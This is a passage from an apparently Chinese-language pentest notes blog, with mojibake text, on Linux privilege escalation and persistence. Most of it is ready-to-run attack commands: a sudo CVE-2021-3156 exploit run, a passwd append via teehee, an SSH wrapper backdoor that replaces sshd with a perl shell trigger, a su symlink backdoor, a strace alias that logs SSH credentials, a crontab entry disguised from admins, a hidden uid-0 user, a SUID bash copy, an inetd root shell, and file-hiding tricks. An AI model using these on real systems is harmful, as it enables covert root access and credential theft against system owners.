fileï¼Œåˆ™è¡¨ç¤ºè¯¥æ¼æ´å­˜åœ¨</p></blockquote><p><strong>EXPä½¿ç”¨</strong></p><p><a href="https://github.com/worawit/CVE-2021-3156">https://github.com/worawit/CVE-2021-3156</a></p><ul><li><p>å¯¹äº glibc æ”¯æŒå¹¶å¯ç”¨äº† tcache çš„ Linux å‘è¡Œç‰ˆï¼ˆCentOS 8ã€Ubuntu &gt;&#x3D; 17.10ã€Debian 10ï¼‰</p><p>exploit_nss.pyâ†’exploit_timestamp_race.c</p></li><li><p>å¯¹äº glibc ä¸æ”¯æŒ tcache çš„ Linux å‘è¡Œç‰ˆï¼ˆDebian 9, Ubuntu 16.04, or Ubuntu 14.04ï¼‰</p><p>exploit_nss_xxx.pyâ†’exploit_defaults_mailer.pyâ†’exploit_userspec.py</p></li></ul><p><a href="https://github.com/blasty/CVE-2021-3156">blasty&#x2F;CVE-2021-3156 (github.com)</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">./sudo-hax-me-a-sandwich num <span class="comment"># é€‰æ‹©åˆé€‚çš„åºå·</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231015214211618.png" alt="image-20231015214211618"></p><h3 id="ç¯å¢ƒå˜é‡ææƒ"><a href="#ç¯å¢ƒå˜é‡ææƒ" class="headerlink" title="ç¯å¢ƒå˜é‡ææƒ"></a>ç¯å¢ƒå˜é‡ææƒ</h3><p>æœ¬è´¨ä¸Šè¿˜æ˜¯suidææƒï¼Œåªä¸è¿‡å…·æœ‰suidæƒé™çš„å‘½ä»¤æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ï¼Œè°ƒç”¨äº†å…¶ä»–å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ«æŒè°ƒç”¨çš„å…¶ä»–å‘½ä»¤æ¥ææƒã€‚</p><p>æ¯”å¦‚æœ‰ä¸€ä¸ªrootç”¨æˆ·è‡ªå®šä¹‰çš„å…·æœ‰suidæƒé™çš„testå‘½ä»¤ï¼Œè°ƒç”¨äº†ç³»ç»Ÿå‘½ä»¤lsï¼Œé‚£æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¯å†™ç›®å½•ï¼Œé€šè¿‡ä¿®æ”¹$PATHç¯å¢ƒå˜é‡ï¼ŒåŠ«æŒlså‘½ä»¤ã€‚</p><p>å‚è€ƒ<a href="https://fgtbnc.github.io/2023/05/31/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/">ç¯å¢ƒå˜é‡æ³¨å…¥ | Khazâ€™s Blog (fgtbnc.github.io)</a></p><h3 id="æƒé™é…ç½®ä¸å½“ææƒ"><a href="#æƒé™é…ç½®ä¸å½“ææƒ" class="headerlink" title="æƒé™é…ç½®ä¸å½“ææƒ"></a>æƒé™é…ç½®ä¸å½“ææƒ</h3><p>åŸç†ï¼šæŸä¸ªè„šæœ¬æˆ–å‘½ä»¤ä»¥ROOTæƒé™è¿è¡Œï¼Œä½†æ˜¯ä½æƒé™ç”¨æˆ·æ‹¥æœ‰ä¿®æ”¹å†™å…¥æƒé™</p><ul><li>é€šè¿‡pspyæ‰¾åˆ°å¯ç–‘è¿›ç¨‹</li><li>å®šæ—¶ä»»åŠ¡</li><li>â€¦..</li></ul><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><h4 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h4><p>teeheeæ˜¯ä¸ªå°ä¼—çš„linuxç¼–è¾‘å™¨ã€‚å¦‚æœæœ‰sudoæƒé™ã€‚å¯ä»¥åˆ©ç”¨å…¶æ¥ææƒ</p><p>æ ¸å¿ƒæ€è·¯å°±æ˜¯åˆ©ç”¨å…¶åœ¨passwdæ–‡ä»¶ä¸­è¿½åŠ ä¸€æ¡uidä¸º0çš„ç”¨æˆ·æ¡ç›®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§linuxç”¨æˆ·æœºåˆ¶ï¼Œå¦‚æœæ²¡æœ‰shadowæ¡ç›®ï¼Œä¸”passwdç”¨æˆ·å¯†ç æ¡ç›®ä¸ºç©ºçš„æ—¶å€™ï¼Œå¯ä»¥æœ¬åœ°ç›´æ¥suç©ºå¯†ç ç™»å½•ï¼ˆç©ºå¯†ç ä¸èƒ½è¿œç¨‹ç™»å½•ï¼‰ã€‚æ‰€ä»¥åªéœ€è¦æ‰§è¡Œsu raajå°±å¯ä»¥ç™»å½•åˆ°raajç”¨æˆ·ï¼Œè¿™ä¸ªç”¨æˆ·å› ä¸ºuidä¸º0ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯rootæƒé™</p><h1 id="Linuxä¿¡æ¯æ”¶é›†"><a href="#Linuxä¿¡æ¯æ”¶é›†" class="headerlink" title="Linuxä¿¡æ¯æ”¶é›†"></a>Linuxä¿¡æ¯æ”¶é›†</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./gather -a</span><br></pre></td></tr></table></figure><p>é»˜è®¤åœ¨<code>/tmp/report</code>ä¸‹ç”Ÿæˆç»“æœ</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">keyword.txt <span class="comment"># è¿™ä¸ªæœ‰ç‚¹å°‘ï¼Œè¦è‡ªå·±åŠ </span></span><br><span class="line">result.txt</span><br><span class="line">tree.txt <span class="comment"># ç›®å½•ç»“æ„</span></span><br></pre></td></tr></table></figure><p><strong>è‡ªå·±æ·»åŠ å‘½ä»¤æ•´ç†æˆshè„šæœ¬</strong></p><h1 id="Linuxæ¨ªå‘ç§»åŠ¨"><a href="#Linuxæ¨ªå‘ç§»åŠ¨" class="headerlink" title="Linuxæ¨ªå‘ç§»åŠ¨"></a>Linuxæ¨ªå‘ç§»åŠ¨</h1><p>éš§é“æ­å»ºåï¼Œè¿›è¡Œä¸»æœºå’Œç«¯å£æ¢æµ‹ï¼Œè·Ÿå¤–ç½‘å·®ä¸å¤š</p><ul><li><p>Fscan</p></li><li><p>LadonGo</p></li><li><p>æ•æ„Ÿä¿¡æ¯æ”¶é›†</p></li></ul><h1 id="Linuxæƒé™ç»´æŒ"><a href="#Linuxæƒé™ç»´æŒ" class="headerlink" title="Linuxæƒé™ç»´æŒ"></a>Linuxæƒé™ç»´æŒ</h1><h2 id="SSHåé—¨"><a href="#SSHåé—¨" class="headerlink" title="SSHåé—¨"></a>SSHåé—¨</h2><h3 id="SSH-wrapper"><a href="#SSH-wrapper" class="headerlink" title="SSH wrapper"></a>SSH wrapper</h3><p>è¢«æ”»å‡»æœº</p><blockquote><p>é¦–å…ˆå¯åŠ¨çš„æ˜¯&#x2F;usr&#x2F;sbin&#x2F;sshd,è„šæœ¬æ‰§è¡Œåˆ°getpeernameè¿™é‡Œçš„æ—¶å€™ï¼Œæ­£åˆ™åŒ¹é…ä¼šå¤±è´¥ï¼Œäºæ˜¯æ‰§è¡Œä¸‹ä¸€å¥ï¼Œå¯åŠ¨&#x2F;usr&#x2F;bin&#x2F;sshdï¼Œè¿™æ˜¯åŸå§‹sshdã€‚åŸå§‹çš„sshdç›‘å¬ç«¯å£å»ºç«‹äº†tcpè¿æ¥åï¼Œä¼šforkä¸€ä¸ªå­è¿›ç¨‹å¤„ç†å…·ä½“å·¥ä½œã€‚è¿™ä¸ªå­è¿›ç¨‹ï¼Œæ²¡æœ‰ä»€ä¹ˆæ£€éªŒï¼Œè€Œæ˜¯ç›´æ¥æ‰§è¡Œç³»ç»Ÿé»˜è®¤çš„ä½ç½®çš„&#x2F;usr&#x2F;sbin&#x2F;sshdï¼Œè¿™æ ·å­æ§åˆ¶æƒåˆå›åˆ°è„šæœ¬äº†ã€‚æ­¤æ—¶å­è¿›ç¨‹æ ‡å‡†è¾“å…¥è¾“å‡ºå·²è¢«é‡å®šå‘åˆ°å¥—æ¥å­—ï¼Œgetpeernameèƒ½çœŸçš„è·å–åˆ°å®¢æˆ·ç«¯çš„TCPæºç«¯å£ï¼Œå¦‚æœæ˜¯19526å°±æ‰§è¡Œshç»™ä¸ªshell</p><p>ç®€å•ç‚¹å°±æ˜¯ä»sshd forkå‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°å¥—æ¥å­—ï¼Œå¹¶å¯¹è¿è¿‡æ¥çš„å®¢æˆ·ç«¯ç«¯å£è¿›è¡Œäº†åˆ¤æ–­ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¼šå¯¼è‡´sshä¸èƒ½ç”¨</span></span><br><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">echo &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd  </span><br><span class="line">echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line"></span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><blockquote><p> \x00\x004Aæ˜¯13377çš„å¤§ç«¯å½¢å¼</p></blockquote><p>æ”»å‡»æœº</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat STDIO TCP4:IP:22,sourceport=port</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230823151639936.png" alt="image-20230823151639936"></p><p>ä¿®æ”¹é€šä¿¡ç«¯å£</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">port = <span class="number">19526</span></span><br><span class="line">buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,port)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">repr</span>(buffer)</span><br><span class="line"></span><br><span class="line">&gt;&gt;<span class="string">&#x27;\x00\x00LF&#x27;</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27;</span> &gt;&gt;sshd </span><br><span class="line">å˜ä¸º</span><br><span class="line">echo <span class="string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..LF/);&#x27;</span> &gt;&gt;sshd </span><br></pre></td></tr></table></figure><h3 id="SSH-è½¯è¿æ¥åé—¨"><a href="#SSH-è½¯è¿æ¥åé—¨" class="headerlink" title="SSH è½¯è¿æ¥åé—¨"></a>SSH è½¯è¿æ¥åé—¨</h3><blockquote><ol><li><p>PAMè®¤è¯æœºåˆ¶ï¼Œè‹¥sshdæœåŠ¡ä¸­å¼€å¯äº†PAMè®¤è¯æœºåˆ¶ï¼ˆé»˜è®¤å¼€å¯<code>cat /etc/ssh/sshd_config|grep UsePAM</code>ï¼‰ï¼Œå½“ç¨‹åºæ‰§è¡Œæ—¶ï¼ŒPAMæ¨¡å—åˆ™ä¼šæœå¯»PAMç›¸å…³è®¾å®šæ–‡ä»¶ï¼Œè®¾å®šæ–‡ä»¶ä¸€èˆ¬æ˜¯åœ¨&#x2F;etc&#x2F;pam.d&#x2F;ã€‚è‹¥å…³é—­åˆ™ä¼šéªŒè¯å¯†ç ï¼Œæ— æ³•å»ºç«‹è½¯é“¾æ¥åé—¨ã€‚</p></li><li><p>pam_rootok.soä¸»è¦ä½œç”¨æ˜¯ä½¿å¾—uidä¸º0çš„ç”¨æˆ·ï¼Œå³rootç”¨æˆ·å¯ä»¥ç›´æ¥é€šè¿‡è®¤è¯è€Œä¸éœ€è¦è¾“å…¥å¯†ç ã€‚</p></li><li><p><code>find /etc/pam.d |xargs grep &quot;pam_rootok&quot; </code></p><p><img src="/../images/image-20230830230859930.png" alt="image-20230830230859930"></p><p><strong>è¿™äº›éƒ½å¯ä»¥ä½œä¸ºsshè½¯é“¾æ¥åé—¨</strong>ï¼šå½“æˆ‘ä»¬é€šè¿‡ç‰¹å®šçš„ç«¯å£è¿æ¥sshåï¼Œåº”ç”¨åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­å°±ä¼šå»æ‰¾åˆ°é…ç½®æ–‡ä»¶ï¼Œå¦‚ï¼šæˆ‘ä»¬çš„è½¯é“¾æ¥æ–‡ä»¶ä¸º&#x2F;tmp&#x2F;suï¼Œé‚£ä¹ˆåº”ç”¨å°±ä¼šæ‰¾&#x2F;etc&#x2F;pam.d&#x2F;suä½œä¸ºé…ç½®æ–‡ä»¶ï¼Œå› ä¸º&#x2F;etc&#x2F;pam.d&#x2F;suä½¿ç”¨äº†pam_rootok.soæ‰€ä»¥æ— éœ€éªŒè¯å¯†ç å³å¯è¿æ¥ã€‚</p></li></ol></blockquote><p>å¤±è´¥äº†ã€‚ã€‚</p><p><img src="/../images/image-20230830222011164.png" alt="image-20230830222011164"></p><p>æ˜¯å› ä¸ºSSH wrapper</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br></pre></td></tr></table></figure><p>éœ€è¦é‡æ–°å®‰è£…ssh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/sbin/su /tmp/su</span><br><span class="line">/tmp/su -oPort=8888</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230830230550836.png" alt="image-20230830230550836"></p><p>å®é™…ä¸Šæ˜¯éšä¾¿è¾“ä¸€ä¸ªå¯†ç å°±å¯ä»¥ç™»é™†ï¼Œä½†æ˜¯ä¸èƒ½ä¸è¾“å¯†ç ã€‚</p><h3 id="SSH-å…¬é’¥å…å¯†ç™»é™†"><a href="#SSH-å…¬é’¥å…å¯†ç™»é™†" class="headerlink" title="SSH å…¬é’¥å…å¯†ç™»é™†"></a>SSH å…¬é’¥å…å¯†ç™»é™†</h3><p>ä¹‹å‰æ‰“é¶æœºçš„æ—¶å€™çš„ç¬”è®°</p><p>sshéªŒè¯æ–¹å¼</p><p><img src="/../images/image-20230304140701229-1693405604693.png" alt="image-20230304140701229"></p><p>è¿™é‡Œç¬¬äºŒç§ï¼šå‡è®¾ä¸»æœºAè¦ç”¨SSHç™»å½•åˆ°ä¸»æœºBï¼Œé‚£ä¹ˆåªè¦ä¸»æœºAæœ‰ç§é’¥ï¼Œä¸»æœºBæœ‰å¯¹åº”çš„å…¬é’¥å³å¯ï¼Œä¸æ˜¯ä¸»æœºAç”Ÿäº§çš„ï¼Œè¿˜æ˜¯ä¸»æœºBç”Ÿæˆçš„æ— å…³ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hostä¸ºä¸»æœºåï¼ˆrootï¼‰</span></span><br><span class="line">ssh host@ip -p portï¼ˆpasswordéªŒè¯ï¼‰</span><br><span class="line">ssh host@ip -i id_rsa -p port(å¯†é’¥éªŒè¯ï¼Œç§é’¥æƒé™è¦ä¸º600æ‰å¯ä»¥ä½¿ç”¨)</span><br></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶<code>/etc/ssh/sshd_config</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PasswordAuthentication yes #å¯ç”¨å¯†ç éªŒè¯</span><br><span class="line">PubkeyAuthentication yes #å¯ç”¨å¯†é’¥å¯¹éªŒè¯</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys #æŒ‡å®šå…¬é’¥åº“æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>æµç¨‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa # ç”Ÿæˆå¯†é’¥å¯¹</span><br><span class="line">cat id_rsa.pub &gt; authorized_keys #å°†å…¬é’¥å†…å®¹æ”¾åˆ°ç›®æ ‡.ssh/authorized_keysé‡Œ </span><br><span class="line"></span><br><span class="line">ssh-copy-id host@ip -p 22 #å°†å…¬é’¥ä¸Šä¼ è‡³è¿œç¨‹æœåŠ¡å™¨ç”¨æˆ·ç›®å½•ä¸­</span><br></pre></td></tr></table></figure><h2 id="straceåé—¨"><a href="#straceåé—¨" class="headerlink" title="straceåé—¨"></a>straceåé—¨</h2><p>é€šè¿‡<strong>å‘½ä»¤æ›¿æ¢ï¼ˆå‘½ä»¤è¡Œå¯åŠ¨æ–‡ä»¶åŠ å…¥aliasï¼‰</strong>åŠ¨æ€è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®ï¼Œå¯ä»¥ç”¨æ¥è®°å½•ç”¨æˆ·sshã€suã€sudoçš„æ“ä½œã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ç›‘æ§ssh</span></span><br><span class="line">echo &quot;alias ssh=&#x27;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#x27;&quot; &gt;&gt; /root/.bashrc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ç«‹å³ç”Ÿæ•ˆ</span></span><br><span class="line">source /root/.bashrc</span><br></pre></td></tr></table></figure><p>kaliæ²¡æœ‰straceï¼Œä½†æ˜¯äº‘æœåŠ¡å™¨é»˜è®¤æ˜¯è£…äº†çš„</p><p><img src="/../images/image-20230830223830491.png" alt="image-20230830223830491"></p><p>æŸ¥çœ‹è®°å½•çš„sshè¿æ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /tmp/.ssh.log </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230830232440346.png" alt="image-20230830232440346"></p><h2 id="è‡ªå¯åŠ¨æ–‡ä»¶åé—¨"><a href="#è‡ªå¯åŠ¨æ–‡ä»¶åé—¨" class="headerlink" title="è‡ªå¯åŠ¨æ–‡ä»¶åé—¨"></a>è‡ªå¯åŠ¨æ–‡ä»¶åé—¨</h2><p>å†™å…¥è‡ªå¯åŠ¨æ–‡ä»¶ä¸­</p><ul><li><p>å¼€æœºå¯åŠ¨é¡¹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/</span><br><span class="line">/etc/profile.d/</span><br><span class="line">/etc/rc.d/xxx <span class="comment"># åœ¨xxxä¸­æ·»åŠ éœ€è¦å¼€æœºæ‰§è¡Œçš„è„šæœ¬çš„ç»å¯¹è·¯å¾„</span></span><br></pre></td></tr></table></figure></li><li><p>bash shellå¯åŠ¨é¡¹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/profile </span><br><span class="line"><span class="variable">$HOME</span>/.bash_profile</span><br><span class="line"><span class="variable">$HOME</span>/.bashrc </span><br><span class="line"><span class="variable">$HOME</span>/.bash_login </span><br><span class="line"><span class="variable">$HOME</span>/.profile </span><br></pre></td></tr></table></figure></li></ul><h2 id="å®šæ—¶ä»»åŠ¡åé—¨"><a href="#å®šæ—¶ä»»åŠ¡åé—¨" class="headerlink" title="å®šæ—¶ä»»åŠ¡åé—¨"></a>å®šæ—¶ä»»åŠ¡åé—¨</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo xxx &gt; /tmp/1.elf</span><br><span class="line">chmod +x /tmp/1.elf</span><br><span class="line"></span><br><span class="line">(crontab -l;printf &quot;*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230830235507613.png" alt="image-20230830235507613"></p><p>å°†no crontab for <code>whoami</code>æ–‡ä»¶å†™åˆ°&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;rootä¸­ï¼Œè€Œcrontab -lå°±æ˜¯åˆ—å‡ºäº†è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚æ‰€ä»¥å½“ç®¡ç†å‘˜ä½¿ç”¨crontab -læŸ¥çœ‹å®šæ—¶ä»»åŠ¡æ—¶ï¼Œå°±ä¼šçœ‹åˆ°no crontab for rootï¼Œä»è€Œèµ·åˆ°äº†éšè—çš„æ•ˆæœã€‚</p><p><img src="/../images/image-20230830235746458.png" alt="image-20230830235746458"></p><h2 id="æ·»åŠ è¶…çº§ç”¨æˆ·"><a href="#æ·»åŠ è¶…çº§ç”¨æˆ·" class="headerlink" title="æ·»åŠ è¶…çº§ç”¨æˆ·"></a>æ·»åŠ è¶…çº§ç”¨æˆ·</h2><p>åº”æ€¥å“åº”ç¬¬ä¸€ä¸ªå°±æ’æŸ¥<code>/etc/passwd</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230831001351639.png" alt="image-20230831001351639"></p><h2 id="Suidåé—¨"><a href="#Suidåé—¨" class="headerlink" title="Suidåé—¨"></a>Suidåé—¨</h2><blockquote><p><strong>SUIDæƒé™ä»…å¯¹äºŒè¿›åˆ¶ç¨‹åºæœ‰æ•ˆ</strong></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /tmp/.long #å°†bashå‘½ä»¤cpåˆ°.longäºŒè¿›åˆ¶ç¨‹åºä¸­</span><br><span class="line">chmod u+s /tmp/.long #èµ‹äºˆSUIDæ–‡ä»¶çš„æƒé™</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/tmp/.long -p </span><br></pre></td></tr></table></figure><blockquote><p>bash2 é’ˆå¯¹suidæœ‰ä¸€äº›é˜²æŠ¤ï¼Œæ‰€ä»¥éœ€è¦åŠ ä¸Š-på‚æ•°æ¥è·å–ä¸€ä¸ªrootçš„shellã€‚</p></blockquote><p><img src="/../images/image-20230831155343319.png" alt="image-20230831155343319"></p><h2 id="inetdåé—¨"><a href="#inetdåé—¨" class="headerlink" title="inetdåé—¨"></a>inetdåé—¨</h2><p>inetdæ˜¯ä¸€ä¸ªç›‘å¬å¤–éƒ¨ç½‘ç»œè¯·æ±‚(å°±æ˜¯ä¸€ä¸ªsocket)çš„ç³»ç»Ÿå®ˆæŠ¤è¿›ç¨‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸º13ç«¯å£ã€‚å½“inetdæ¥æ”¶åˆ°ä¸€ä¸ªå¤–éƒ¨è¯·æ±‚åï¼Œå®ƒä¼šæ ¹æ®è¿™ä¸ªè¯·æ±‚åˆ°è‡ªå·±çš„é…ç½®æ–‡ä»¶ä¸­å»æ‰¾åˆ°å®é™…å¤„ç†å®ƒçš„ç¨‹åºï¼Œç„¶åå†æŠŠæ¥æ”¶åˆ°çš„è¿™ä¸ªsocketäº¤ç»™é‚£ä¸ªç¨‹åºå»å¤„ç†ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…</span></span><br><span class="line">apt-get install openbsd-inetd  </span><br><span class="line"><span class="comment"># å†™å…¥é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;daytime stream tcp nowait root /bin/bash bash -i&#x27;</span> &gt;&gt; /etc/inetd.conf</span><br><span class="line"><span class="comment"># è¯·æ±‚daytimeæœåŠ¡å¯¹åº”çš„13ç«¯å£</span></span><br><span class="line">nc -vv 192.168.111.128 13</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231015225609770.png" alt="image-20231015225609770"></p><p>é…ç½®è§£é‡Š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;service_name&gt; &lt;sock_type&gt; &lt;protoï¼šTCP/UDP&gt; &lt;flags&gt; &lt;user&gt; &lt;server_pathï¼šç»å¯¹è·¯å¾„&gt; &lt;args&gt;</span><br><span class="line">daytime stream tcp nowait root /bin/bash bash -i <span class="comment"># å½“å¤–éƒ¨è¯·æ±‚åä¸ºdaytimeçš„æœåŠ¡æ—¶å°±å¼¹shell</span></span><br></pre></td></tr></table></figure><p>æ›´æ”¹çš„è¯åªéœ€è¦ä¿®æ”¹service_nameå’Œncè¿æ¥çš„ç«¯å£ï¼ŒæœåŠ¡ä¸ç«¯å£çš„æ˜ å°„å…³ç³»åœ¨<code>/etc/services</code>ä¸­</p><h2 id="ICMPåé—¨"><a href="#ICMPåé—¨" class="headerlink" title="ICMPåé—¨"></a>ICMPåé—¨</h2><p><a href="https://github.com/andreafabrizi/prism">https://github.com/andreafabrizi/prism</a></p><h2 id="DNSåé—¨"><a href="#DNSåé—¨" class="headerlink" title="DNSåé—¨"></a>DNSåé—¨</h2><p><a href="https://github.com/DamonMohammadbagher/NativePayload_DNS">https://github.com/DamonMohammadbagher/NativePayload_DNS</a><br><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a><br><a href="http://code.kryo.se/iodine">http://code.kryo.se/iodine</a></p><h2 id="è¿›ç¨‹æ³¨å…¥"><a href="#è¿›ç¨‹æ³¨å…¥" class="headerlink" title="è¿›ç¨‹æ³¨å…¥"></a>è¿›ç¨‹æ³¨å…¥</h2><p><a href="https://github.com/gaffe23/linux-inject">https://github.com/gaffe23/linux-inject</a><br><a href="https://sourceforge.net/projects/cymothoa/files/">https://sourceforge.net/projects/cymothoa/files/</a><br><a href="https://github.com/screetsec/Vegile">https://github.com/screetsec/Vegile</a></p><h2 id="éšè—æ–‡ä»¶-x2F-ç›®å½•æŠ€å·§"><a href="#éšè—æ–‡ä»¶-x2F-ç›®å½•æŠ€å·§" class="headerlink" title="éšè—æ–‡ä»¶&#x2F;ç›®å½•æŠ€å·§"></a>éšè—æ–‡ä»¶&#x2F;ç›®å½•æŠ€å·§</h2><ul><li><p>åˆ›å»ºä»¥.å¼€å¤´çš„éšè—æ–‡ä»¶</p><p>ç”¨<code>ls -a</code>æ‰èƒ½çœ‹åˆ°</p></li><li><p>å»ºç«‹æ–‡ä»¶åä¸º<code>...</code>çš„æ–‡ä»¶</p></li><li><p>å‚æ•°æ··æ·†</p><blockquote><p>ä¸‹é¢ä¸¤ç§æ–¹æ³•å¯ä»¥ä½¿ç”¨<code>rm -- -rm</code>åˆ é™¤</p></blockquote><ul><li>å»ºç«‹æ–‡ä»¶åä¸º<code>-rm</code>çš„æ–‡ä»¶</li></ul><p><img src="/../images/image-20231015223351352.png" alt="image-20231015223351352"></p><ul><li><p>å»ºç«‹æ–‡ä»¶åä¸º<code>--</code>çš„æ–‡ä»¶</p><p><img src="/../images/image-20231015223510528.png" alt="image-20231015223510528"></p><p>æ—¢ä¸æŠ¥é”™ï¼Œä¹Ÿæ²¡æœ‰åˆ é™¤</p></li></ul></li><li><p>chattréšè—æƒé™</p><blockquote><p>chattr +i æ˜¯ä¸€ä¸ª Linux å‘½ä»¤ï¼Œç”¨äºå°†æ–‡ä»¶æˆ–ç›®å½•è®¾ç½®ä¸ºä¸å¯ä¿®æ”¹ï¼ˆimmutableï¼‰ã€‚å½“åº”ç”¨äº† +i å±æ€§åï¼Œæ–‡ä»¶æˆ–ç›®å½•å°†æ— æ³•è¢«ä¿®æ”¹ã€åˆ é™¤ã€é‡å‘½åæˆ–é“¾æ¥ã€‚è¿™ä¸ªå±æ€§ä¸»è¦ç”¨äºä¿æŠ¤å…³é”®ç³»ç»Ÿæ–‡ä»¶æˆ–ç›®å½•ï¼Œé˜²æ­¢å®ƒä»¬è¢«æ„å¤–æˆ–æ¶æ„ç¯¡æ”¹ã€‚è¯·æ³¨æ„ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦åœ¨<strong>å…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·</strong>ä¸‹æ‰§è¡Œ</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chattr +i hack.sh  <span class="comment">#lsattræ‰å¯ä»¥çœ‹åˆ°è¯¥æƒé™</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230831163015163.png" alt="image-20230831163015163"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ é™¤</span></span><br><span class="line">chattr -i hack.sh</span><br><span class="line"><span class="built_in">rm</span> -rf hack.sh</span><br></pre></td></tr></table></figure><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><p>éœ€è¦python3ç¯å¢ƒ<a href="https://github.com/RuoJi6/HackerPermKeeper">RuoJi6&#x2F;HackerPermKeeper (github.com)</a></p><table><thead><tr><th>ğŸ”’æƒé™ç»´æŒæ¨¡å—</th><th>centos</th><th>Ubuntu</th><th>æ¨èæŒ‡æ•°</th><th>éœ€è¦æƒé™</th><th>å¤‡æ³¨</th><th>py2</th><th>py3</th></tr></thead><tbody><tr><td>OpenSSHåé—¨ä¸‡èƒ½å¯†ç &amp;è®°å½•å¯†ç </td><td>âŒ</td><td>âœ”ï¸</td><td>â­</td><td>root</td><td>æ­¤åé—¨éœ€è¦å¾ˆè€çš„å†…æ ¸ç‰ˆæœ¬ï¼Œè€Œä¸”éœ€è¦å¾ˆå¤šä¾èµ–ç¯å¢ƒ</td><td>âŒ</td><td>âœ”ï¸</td></tr><tr><td>PAMåé—¨</td><td>âŒ</td><td>âŒ</td><td>â­</td><td>âŒ</td><td>æ­¤åé—¨éœ€è¦å¾ˆè€çš„å†…æ 